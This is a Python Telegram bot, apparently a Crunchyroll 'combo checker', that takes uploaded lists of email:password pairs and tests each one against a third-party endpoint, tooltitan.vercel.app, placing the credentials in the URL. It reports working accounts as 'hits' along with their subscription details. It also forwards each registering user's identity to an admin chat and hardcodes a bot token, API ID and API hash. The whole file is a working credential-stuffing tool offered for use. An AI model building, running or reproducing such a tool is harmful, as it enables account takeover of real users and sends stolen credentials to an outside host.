import asyncio
import aiohttp
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# Bot Configuration
BOT_TOKEN = "7772469056:AAFN5Y8gowJvaxhaS6JZJC03ICKOTmzDhKs"
API_ID = 28271744
API_HASH = "1df4d2b4dc77dc5fd65622f9d8f6814d"
ADMIN_CHAT_ID = 6653249747

# Initialize Bot
app = Client("crunchy_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Global Variables
registered_users = set()
tasks = {}
chat_data = {}

# Start Command
@app.on_message(filters.command("start") & filters.private)
async def start_command(client, message):
    await message.reply(
        "↯ **CRUNCHYROLL CHECKER**\n\n"
        "📌 **Welcome! Use the following commands:**\n\n"
        "🔹 `/register` - Register to use the bot.\n"
        "🔹 `/crunchy` - Start checking combos.\n"
        "🔹 `/cancel` - Cancel all running tasks.\n\n"
        "Use `/register` to get started!",
        quote=True
    )

# Register Command
@app.on_message(filters.command("register") & filters.private)
async def register_command(client, message):
    user_id = message.from_user.id
    if user_id in registered_users:
        await message.reply("✅ **You are already registered!**", quote=True)
    else:
        registered_users.add(user_id)
        user_info = (
            f"↯ **New User Registered!**\n\n"
            f"**Name:** {message.from_user.first_name}\n"
            f"**Username:** @{message.from_user.username or 'N/A'}\n"
            f"**User ID:** `{user_id}`"
        )
        await client.send_message(ADMIN_CHAT_ID, user_info)
        await message.reply("✅ **Registration successful!** Use `/crunchy` to start checking combos.", quote=True)

# Cancel Command
@app.on_message(filters.command("cancel") & filters.private)
async def cancel_command(client, message):
    user_id = message.from_user.id
    if user_id in tasks:
        tasks[user_id].cancel()
        del tasks[user_id]
        await message.reply("🚫 **All running tasks have been canceled.**", quote=True)
    else:
        await message.reply("❌ **No running tasks to cancel.**", quote=True)

# Crunchy Command
@app.on_message(filters.command("crunchy") & filters.private)
async def crunchy_command(client, message):
    user_id = message.from_user.id
    if user_id not in registered_users:
        await message.reply("❌ **You must register first using `/register` to use this command.**", quote=True)
        return

    if message.reply_to_message and message.reply_to_message.document:
        document = message.reply_to_message.document
        if document.mime_type == "text/plain":
            processing_message = await message.reply("⏳ **Processing your accounts...**", quote=True)
            file = await client.download_media(document)
            with open(file, "r") as f:
                combos = f.readlines()

            # Start Checking Combos
            task = asyncio.create_task(check_combos(client, message, combos, processing_message))
            tasks[user_id] = task
        else:
            await message.reply("❌ **Please reply to a valid text file containing email:password combos.**", quote=True)
    else:
        await message.reply("❌ **Reply to a valid text file with the `/crunchy` command.**", quote=True)

# Check Combos
async def check_combos(client, message, combos, processing_message):
    hits = []
    dead = []
    chat_id = message.chat.id

    # Remove "Processing" message
    await processing_message.delete()

    # Send Live Update Message
    sent_message = await message.reply(
        "↯ **CRUNCHYROLL CHECKER**\n\n"
        "⏳ **Checking your accounts...**",
        quote=True,
        reply_markup=get_live_buttons(0, 0, len(combos))
    )

    for i, combo in enumerate(combos):
        email, password = combo.strip().split(":", 1)
        status, response = await check_crunchy_account(email, password)

        if status == "Hit":
            hits.append(combo.strip())
            hit_message = (
                "↯ **CRUNCHYROLL CHECKER**\n\n"
                "✅ **HIT FOUND!**\n\n"
                f"**Combo:** `{combo.strip()}`\n"
                f"**Email Verified:** {response['email_verified']}\n"
                f"**Subscription Name:** {response['subscription_name']}\n"
                f"**Effective Date:** {response['effective_date']}\n"
                f"**Expiry Date:** {response['expiry_date']}\n"
                f"**Active Free Trial:** {response['active_free_trial']}\n"
                f"**Developer:** {response['dev']}"
            )
            await message.reply(hit_message, quote=True)
        else:
            dead.append(combo.strip())

        # Update Live Message
        await sent_message.edit(
            "↯ **CRUNCHYROLL CHECKER**\n\n"
            f"📊 **Progress:**\n\n"
            f"🔹 **Total:** {len(combos)}\n"
            f"🔹 **Checked:** {i + 1}\n"
            f"🔹 **Remaining:** {len(combos) - (i + 1)}\n"
            f"✅ **Hits:** {len(hits)}\n"
            f"❌ **Dead:** {len(dead)}",
            reply_markup=get_live_buttons(len(hits), len(dead), len(combos) - (i + 1))
        )

    # Final Summary
    final_message = (
        "↯ **CRUNCHYROLL CHECKER**\n\n"
        f"✅ **Checking Completed!**\n\n"
        f"🔹 **Total Combos:** {len(combos)}\n"
        f"✅ **Hits:** {len(hits)}\n"
        f"❌ **Dead:** {len(dead)}"
    )
    await sent_message.edit(final_message)

    # Send All Hits
    if hits:
        hits_message = "✅ **HIT RESULTS:**\n\n" + "\n".join(hits)
        await message.reply(hits_message, quote=True)

# Get Inline Buttons
def get_live_buttons(hits, dead, remaining):
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"✅ Hits: {hits}", callback_data="get_hits"),
            InlineKeyboardButton(f"❌ Dead: {dead}", callback_data="get_dead"),
        ],
        [InlineKeyboardButton(f"🔄 Remaining: {remaining}", callback_data="remaining")]
    ])

# Callback Handler for Inline Buttons
@app.on_callback_query()
async def callback_query_handler(client, query):
    if query.data == "get_hits":
        hits = chat_data.get(query.message.chat.id, {}).get("hits", [])
        if hits:
            await query.message.reply(f"✅ **Hits:**\n\n" + "\n".join(hits))
        else:
            await query.answer("No hits yet!")
    elif query.data == "get_dead":
        dead = chat_data.get(query.message.chat.id, {}).get("dead", [])
        if dead:
            await query.message.reply(f"❌ **Dead:**\n\n" + "\n".join(dead))
        else:
            await query.answer("No dead accounts yet!")

# Crunchyroll API Check
async def check_crunchy_account(email, password):
    url = f"https://tooltitan.vercel.app/crunchy?combo={email}:{password}"
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as response:
            if response.status == 200:
                data = await response.json()
                if data.get("status") == "success":
                    return "Hit", data
                else:
                    return "Dead", data
            return "Dead", {}

# Run the Bot
app.run()
